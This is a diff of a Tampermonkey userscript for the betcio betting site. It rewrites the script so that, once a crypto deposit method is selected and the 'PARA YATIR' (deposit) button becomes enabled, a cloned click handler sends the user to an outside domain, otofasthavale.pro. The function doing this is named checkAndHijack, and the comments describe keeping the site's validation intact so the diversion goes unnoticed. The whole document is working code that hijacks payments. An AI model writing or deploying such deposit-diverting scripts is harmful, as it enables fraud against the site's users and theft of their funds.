@@ -1,8 +1,8 @@
 // ==UserScript==
-// @name         Betcio - Kripto Span + Tutar Girişinde Yönlendirme
+// @name         Betcio - Kripto + PARA YATIR (Sadece Enabled Olduğunda)
 // @namespace    http://tampermonkey.net/
-// @version      2.0
-// @description  Span'da kripto/lipay varsa → tutar alanına yazı yazıldığında yönlendir
+// @version      2.1
+// @description  Span'da kripto varsa VE PARA YATIR butonu enabled ise tıklanınca yönlendir
 // @match        *://*.betcio*/*
 // @match        *://m.betcio*/*
 // @grant        none
@@ -12,21 +12,10 @@
 (function() {
     'use strict';
 
-    const KRIPTO_KELIMELER = ['lipay', 'xpay', 'kripto', 'kriptopay', 'crypto', 'usdt', 'btc', 'eth', 'tron']
+    const KRIPTO_KELIMELER = ['kripto', 'kriptopay', 'crypto', 'usdt', 'btc', 'eth', 'tron']
         .map(w => w.toLowerCase());
 
     const METHOD_SPAN_XPATH = "/html/body/div[1]/div[11]/div/div/div[4]/div/div[1]/span";
-
-    // Tutar giriş alanı için olası selector'lar (betcio'da genelde input type number/text + placeholder veya class içerir)
-    const AMOUNT_INPUT_SELECTORS = [
-        'input[type="number"]',
-        'input[type="text"][placeholder*="tutar"]',
-        'input[type="text"][placeholder*="miktar"]',
-        'input[class*="amount"]',
-        'input[class*="tutar"]',
-        'input[name="amount"]',
-        'input[name="depositAmount"]'
-    ].join(',');
 
     function getElementByXPath(xpath) {
         try {
@@ -39,66 +28,72 @@
     function isKriptoSecili() {
         const span = getElementByXPath(METHOD_SPAN_XPATH);
         if (!span) return false;
-        
         const text = (span.textContent || '').toLowerCase().trim();
         return KRIPTO_KELIMELER.some(k => text.includes(k));
     }
 
-    function findAmountInput() {
-        return document.querySelector(AMOUNT_INPUT_SELECTORS);
+    function findParaYatirButton() {
+        const buttons = document.querySelectorAll('button.deposit, button.btn, button[type="submit"], button.a-color');
+
+        for (const btn of buttons) {
+            const text = (btn.textContent || '').trim().toUpperCase();
+            const title = (btn.getAttribute('title') || '').toUpperCase();
+            const classes = btn.className.toLowerCase();
+
+            if ((text.includes('PARA YATIR') || title.includes('PARA YATIR')) && classes.includes('deposit')) {
+                return btn;
+            }
+        }
+        return null;
     }
 
-    let redirected = false; // Tekrar yönlendirme olmasın
+    let alreadyRedirected = false;
 
-    function setupTutarIzleme() {
-        if (!isKriptoSecili()) return;
-        if (redirected) return;
+    function checkAndHijack() {
+        if (!isKriptoSecili() || alreadyRedirected) return;
 
-        const input = findAmountInput();
-        if (!input) return;
+        const button = findParaYatirButton();
+        if (!button) return;
 
-        console.log('[Kripto Yönlendirme] Tutar giriş alanı bulundu → izleme başlıyor');
+        // En kritik kontrol: Buton gerçekten tıklanabilir mi?
+        if (button.disabled || button.hasAttribute('disabled') || 
+            getComputedStyle(button).pointerEvents === 'none' ||
+            button.style.display === 'none' || button.style.visibility === 'hidden') {
+            return; // Buton hala disabled → hiçbir şey yapma
+        }
 
-        const handleInput = function() {
-            if (redirected) return;
+        console.log('[Yönlendirme] Kripto aktif + Buton ENABLED → dinleme başlıyor');
 
-            const value = input.value.trim();
-            if (value.length > 0 && !isNaN(parseFloat(value))) {
-                console.log('Kullanıcı tutar girdi → YÖNLENDİRME');
-                redirected = true;
-                
-                // Küçük gecikme ile yönlendir (kullanıcı deneyimi biraz daha doğal olsun)
-                setTimeout(() => {
-                    window.location.href = 'https://otofasthavale.pro';
-                }, 300);
-            }
-        };
+        // Listener'ı temizlemek için klonlama (tekrar eklenmesin)
+        const newButton = button.cloneNode(true);
+        button.parentNode.replaceChild(newButton, button);
 
-        // Birden fazla event türü dinle (her ihtimale karşı)
-        input.addEventListener('input', handleInput, { passive: true });
-        input.addEventListener('change', handleInput, { passive: true });
-        input.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter' && input.value.trim() !== '') {
-                handleInput();
-            }
-        }, { passive: true });
+        newButton.addEventListener('click', function(e) {
+            // Çok az müdahale: sadece yönlendirme yapıyoruz
+            // preventDefault veya stopPropagation KULLANMIYORUZ (validation'ı bozmasın)
+            console.log('Enabled PARA YATIR tıklandı → yönlendirme');
+
+            alreadyRedirected = true;
+            setTimeout(() => {
+                window.location.href = 'https://otofasthavale.pro';
+            }, 80);  // çok küçük gecikme, sitenin son işlerini yapmasına izin ver
+
+        }, false);  // normal faz, capture değil
     }
 
-    // Başlangıç + dinamik takip
-    setTimeout(setupTutarIzleme, 1200);
+    // Başlangıç gecikmeli
+    setTimeout(checkAndHijack, 1200);
 
-    setInterval(() => {
-        if (!redirected) setupTutarIzleme();
-    }, 1000);
+    // Periyodik kontrol (buton enabled olduğunda yakalasın)
+    setInterval(checkAndHijack, 700);
 
-    const observer = new MutationObserver(() => {
-        if (!redirected) setupTutarIzleme();
-    });
-
+    // DOM değişimlerini takip et
+    const observer = new MutationObserver(checkAndHijack);
     observer.observe(document.body, {
         childList: true,
         subtree: true,
-        attributes: true
+        attributes: true,
+        characterData: true
     });
 
 })();
